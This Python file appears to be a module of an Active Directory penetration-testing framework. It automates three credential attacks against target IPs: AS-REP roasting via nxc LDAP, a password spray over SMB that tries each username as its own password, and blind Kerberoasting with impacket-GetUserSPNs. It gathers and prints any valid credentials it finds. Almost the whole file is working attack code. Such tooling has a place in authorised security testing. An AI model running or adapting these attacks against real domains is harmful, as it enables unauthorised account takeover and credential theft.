# modules/valid_user_no_pass/no_pass.py

from core.module_base import ModuleBase
from utils.input_or_file import get_input_or_file
from utils.run_command import run_command
from colorama import Fore, Style
import os

class ValidUser(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "valid_user"
        self.options = {
            "ip": None,
            "user_file": None,
            "domain": None
        }
        self.actions = {
            "asreproast": self.asreproast,
            "spray": self.password_spray,
            "blind_kerberoasting": self.blind_kerberoasting,
            "all": self.run_all,
        }

    def _prepare(self):
        ip = self.options["ip"]
        user_file = self.options["user_file"]
        if not ip or not user_file:
            print("[-] ip and user_file must be set!")
            return None, None
        ip_list = get_input_or_file(ip)
        users = get_input_or_file(user_file)
        return ip_list, users

    
    def banner(self):
        print(Fore.BLUE + f"\n🔥 MODULE {self.name.upper()} 🔥 \n" + Style.RESET_ALL)
        print("\n See options and set a target with 'options'\n")



    ################## 

    def asreproast(self):
        ip_list, users = self._prepare()
        if not ip_list: return
        for ip in ip_list:
            for user in users:
                output_file = os.path.join("results", f"{user}_asreproast.txt")
                command = ["nxc", "ldap", ip, "-u", user, "-p", "", "--asreproast", output_file]
                res = run_command(command)
                print(f"{Fore.BLUE}[ASREPROAST]{Style.RESET_ALL} {user}@{ip} → {res}")

    def password_spray(self):
        ip_list, users = self._prepare()
        if not ip_list: 
            return
        
        valids = []

        for ip in ip_list:
            for user in users:
                command = ["nxc", "smb", ip, "-u", user, "-p", user, "--no-bruteforce", "--continue-on-success"]
                res = run_command(command)
                print(f"{Fore.BLUE}[SPRAY]{Style.RESET_ALL} {user}:{user}@{ip} → {res}")
                if "[+]" in res:
                    valids.append(f"{Fore.GREEN}[SPRAY] {user}:{user}@{ip} => ✅ VALID {Style.RESET_ALL}")
                    #print(f"{Fore.GREEN}[SPRAY] {user}:{user}@{ip} => ✅ VALID {Style.RESET_ALL}")
                #print(f"{Fore.BLUE}[SPRAY]{Style.RESET_ALL} {user}:{user}@{ip} → {res}")
            if valids:
                print(f"\n{Fore.BLUE} FINDINGS {Style.RESET_ALL}")
                for cred in valids: 
                    print(f"{cred}")

    def blind_kerberoasting(self):
        ip_list, users = self._prepare()
        domain = self.options["domain"]
        if not domain:
            print("[-] domain must be set for blind kerberoasting.")
            return
        for ip in ip_list:
            for user in users:
                command = ["impacket-GetUserSPNs", "-no-preauth", user, "-usersfile", "-", "-dc-host", ip, domain]
                res = run_command(command)
                print(f"{Fore.BLUE}[BLIND_KERB]{Style.RESET_ALL} {user}@{ip} → {res}")
    


    def run_all(self):
        print("\n[🔥] Running all valid_user actions...\n")
        if not self.options["ip"] or not self.options["user_file"]:
            print("[-] Need ip and/or domain... use 'options'")
            return
        if not self.options["domain"]:
            print("[-] Domain not set, blind kerberoasting may not work properly")
        self.asreproast()
        self.password_spray()
        self.blind_kerberoasting()